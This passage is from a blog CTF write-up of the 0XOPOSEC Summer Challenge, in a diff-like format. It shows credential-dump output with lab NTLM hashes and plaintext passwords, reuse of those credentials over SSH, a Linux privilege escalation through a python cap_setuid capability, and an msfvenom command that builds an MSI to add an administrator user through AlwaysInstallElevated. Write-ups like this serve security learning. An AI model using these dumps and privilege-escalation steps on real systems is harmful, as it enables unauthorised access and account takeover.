+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User Name         : rogerio.marques
+</span></span><span style="display:flex;"><span>Domain            : BAJORDAS
+</span></span><span style="display:flex;"><span>Logon Server      : WIN-DC01
+</span></span><span style="display:flex;"><span>Logon Time        : 8/23/2022 10:11:40 PM
+</span></span><span style="display:flex;"><span>SID               : S-1-5-21-705575555-4224697876-3339875019-1121
+</span></span><span style="display:flex;"><span>        msv :
+</span></span><span style="display:flex;"><span>         <span style="color:#719e07">[</span>00000003<span style="color:#719e07">]</span> Primary
+</span></span><span style="display:flex;"><span>         * Username : rogerio.marques
+</span></span><span style="display:flex;"><span>         * Domain   : BAJORDAS
+</span></span><span style="display:flex;"><span>         * NTLM     : a3d7d25665f1146b56192b850fd57a93
+</span></span><span style="display:flex;"><span>         * SHA1     : 78936dac0d808daf0f58313fa74666ef26b41e40
+</span></span><span style="display:flex;"><span>         * DPAPI    : 6ccf347c45ff34bd7211b7d286a25d23
+</span></span><span style="display:flex;"><span>        kerberos :
+</span></span><span style="display:flex;"><span>         * Username : rogerio.marques
+</span></span><span style="display:flex;"><span>         * Domain   : BAJORDAS.LOCAL
+</span></span><span style="display:flex;"><span>         * Password : Summer2022
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Authentication Id : <span style="color:#2aa198">0</span> ; <span style="color:#2aa198">440390</span> <span style="color:#719e07">(</span>00000000:0006b846<span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>Session           : RemoteInteractive from <span style="color:#2aa198">3</span>
+</span></span><span style="display:flex;"><span>User Name         : Administrator
+</span></span><span style="display:flex;"><span>Domain            : LAB-WIN6
+</span></span><span style="display:flex;"><span>Logon Server      : LAB-WIN6
+</span></span><span style="display:flex;"><span>Logon Time        : 8/22/2022 10:52:50 PM
+</span></span><span style="display:flex;"><span>SID               : S-1-5-21-4139696292-2348944387-3964195370-500
+</span></span><span style="display:flex;"><span>        msv :
+</span></span><span style="display:flex;"><span>        tspkg :
+</span></span><span style="display:flex;"><span>        wdigest :
+</span></span><span style="display:flex;"><span>        kerberos :
+</span></span><span style="display:flex;"><span>        ssp :
+</span></span><span style="display:flex;"><span>        credman :
+</span></span><span style="display:flex;"><span>         <span style="color:#719e07">[</span>00000000<span style="color:#719e07">]</span>
+</span></span><span style="display:flex;"><span>         * Username : BAJORDAS<span style="color:#cb4b16">\b</span>acano.do.it
+</span></span><span style="display:flex;"><span>         * Domain   : BAJORDAS<span style="color:#cb4b16">\b</span>acano.do.it
+</span></span><span style="display:flex;"><span>         * Password : ViniVidiVici420!
+</span></span></code></pre></div><ul>
+<li>Next thing I did was to login with ssh in <code>192.168.111.31</code> with <code>bacano.do.it</code> and I got the flag</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>pinguinsRPeople2<span style="color:#719e07">}</span>
+</span></span></code></pre></div><ul>
+<li>There was another challenge called <code>Shells, Shells, Shells</code> but I got the flag on this one too by using ssh in <code>192.168.111.34</code> with the same creds of <code>bacano.do.it</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>OneMore4TheRoad<span style="color:#719e07">}</span>
+</span></span></code></pre></div><h2 id="first-linux-priv-esc">First Linux Priv Esc<a hidden class="anchor" aria-hidden="true" href="#first-linux-priv-esc">#</a></h2>
+<h3 id="captain-pwn">CAPtain Pwn!<a hidden class="anchor" aria-hidden="true" href="#captain-pwn">#</a></h3>
+<p><em>&ldquo;The System Administrator was having trouble getting scripts to run but found a way to always work!&rdquo;</em></p>
+<p><em>&ldquo;Can you abuse the misconfiguration and pwn the machine?&rdquo;</em></p>
+<br>
+<ul>
+<li>
+<p>Now was time to privesc the Linux box <code>.31</code> so for that I ran <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">linpeas</a></p>
+</li>
+<li>
+<p>The output of linpeas gave me a cool finding about <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/"><code>/usr/bin/python3.8 = cap_setuid+ep</code></a></p>
+</li>
+</ul>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186418732-aa6b5c4c-3941-498c-97c5-e087c5921d95.png"></p>
+<ul>
+<li>
+<p>As the blog post stated <em>&ldquo;As we know when the system creates a work context for each user where they achieve their tasks with the privileges that are assigned to them. So, to provide some specific functionalities, it is necessary for a non-privileged user to sometimes temporarily acquire a superuser profile to perform a specific task. This functionality mainly can be achieved by assigning privileges through sudo, or setuid permissions to an executable file which allows the user to adopt the role of the file owner. To accomplish the same task in a more secure way the system admin uses “capability” which plays an effective role in the security of Linux based operating systems.&rdquo;</em></p>
+</li>
+<li>
+<p>Knowing this It&rsquo;s clear I can execute python (and that will have the setuid bit set) with root privileges, so It&rsquo;s trivial to spawn a shell as root</p>
+</li>
+</ul>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186419606-7ec2df45-5f8a-4b28-b471-6a4aed94f9ec.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>HelloCAPtain<span style="color:#719e07">}</span>
+</span></span></code></pre></div><br>
+<h2 id="second-linux-priv-esc">Second Linux Priv Esc<a hidden class="anchor" aria-hidden="true" href="#second-linux-priv-esc">#</a></h2>
+<h3 id="so-cute">SO Cute!<a hidden class="anchor" aria-hidden="true" href="#so-cute">#</a></h3>
+<p><em>&ldquo;Infrastructure logs show a weird behaviour on one binary left in the server but we couldn&rsquo;t discover how can we abuse it to render the server to its knees. Everything is patched so there will be a challenge.&rdquo;</em></p>
+<p><em>&ldquo;Can you analyze the server and look for ways to overcome its security?&rdquo;</em></p>
+<ul>
+<li>
+<p>The description is straight forward that I need to dig into the logs</p>
+</li>
+<li>
+<p>So knowing this I started to search on linux logs (spent quite some time in this process)</p>
+</li>
+<li>
+<p>Navigating to <code>/usr/sbin</code> I found an interesting binary</p>
+</li>
+</ul>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186481520-196af136-c182-4d89-af6d-4cc50a97989b.png"></p>
+<ul>
+<li>
+<p>I searched for this binary on google and I found nothing so I assume that this was a crafted binary to this challenge</p>
+</li>
+<li>
+<p>Running the binary gave me the following output</p>
+</li>
+</ul>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/186482121-d0393300-bf8b-401b-89e8-2f9ccf777cd7.png"></p>
+<ul>
+<li>Unfortunately I was stuck for a long time on this challenge trying to break it without success so I wasn&rsquo;t able to get the flag</li>
+</ul>
+<h2 id="second-windows-priv-esc">Second Windows Priv Esc<a hidden class="anchor" aria-hidden="true" href="#second-windows-priv-esc">#</a></h2>
+<h3 id="stairway-to-heaven">Stairway To Heaven<a hidden class="anchor" aria-hidden="true" href="#stairway-to-heaven">#</a></h3>
+<p><em>&ldquo;Larapios Group states that they can completely compromise the machine and gain Administrator access through a misconfiguration!&rdquo;</em></p>
+<br>
+<ul>
+<li>
+<p>So I moved to <code>192.168.111.41</code> and after some minutes of enumeration I decided to run <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">winpeas</a></p>
+</li>
+<li>
+<p>winpeas returned an interesting finding, <code>alwaysinstalledelevated</code> was set to 1 so I could <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated">exploit</a> this with a crafted <code>.msi</code> file</p>
+</li>
+<li>
+<p>I setuped a .msi file using <code>msfvenom -p windows/adduser USER=brun0 PASS=n0tSoSecure! -f msi -o alwe.msi</code> and then I uploaded that .msi file to <code>192.168.111.41</code></p>
+</li>
+<li>
+<p>Then I executed the file from the windows box and then typed <code>net user</code> and found that <code>brun0</code> was a valid user</p>
+</li>
+<li>
+<p>Next I did a rdp connection with the new user created to the target machine and I was able to get the Administrator flag in <code>C:\Users\Administrator\Desktop</code></p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>wholeLegInTheEnterprise<span style="color:#719e07">}</span>
+</span></span></code></pre></div><h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
+<p>This was my come back to 0XOPOSEC Summer Challenge (last I did was in 2019) and to be fair I realy liked It because It was more realistic as we could exploit linux machines and windows machines and jump from one to another.
+A recommendation for the next one would be to have a more defined path because there was an handful of achines and the challenges asked for a flag but we had to find what machine should we exploit to get the flag to that specific challenge.
+Other than that was a realy fun one so next is the Christmas challenge!</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/ctf/">CTF</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">Bruno Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
